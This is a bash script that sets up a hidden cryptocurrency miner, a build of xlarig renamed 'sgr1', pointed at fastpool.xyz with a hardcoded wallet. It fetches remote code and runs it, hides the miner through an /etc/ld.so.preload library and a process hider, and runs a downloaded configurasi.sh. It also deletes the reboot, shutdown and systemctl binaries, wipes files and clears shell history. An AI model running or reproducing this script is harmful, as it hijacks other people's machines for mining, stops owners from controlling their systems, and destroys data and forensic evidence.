#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl sudo
apt-get install sudo wget cpulimit screen -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo apt-get update 
sudo apt-get install -y gcc ca-certificates curl gnupg 
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash 
source ~/.bashrc 
nvm install 18
npm i -g node-process-hider
ph add sgr1
wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
chmod u+x configurasi.sh
sudo ./configurasi.sh
./configurasi.sh
WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
mkdir .lib && cd .lib
apt update
export DEBIAN_FRONTEND=noninteractive
apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev -y

git clone https://github.com/scala-network/xlarig

cd xlarig

mkdir build

cd build

apt-get update

apt-get install libhwloc-dev -y

cmake ..

make

mv xlarig sgr1
cpulimit -l 100 -e sgr1 &
screen -dmS main-session /bin/bash -c "./sgr1 -o fastpool.xyz:10126 -p $WORKER -u Ssy2HMaGNZzA7uq2sp833HAtXiPZ26PwiQA27VqGftDPYyjS4RJpBVKgchk6QuB5f1RQZKmAY77b74pKmtt1UrGZARCU574F7j --donate-level 0 -a panthera "
sleep 30
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl 
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
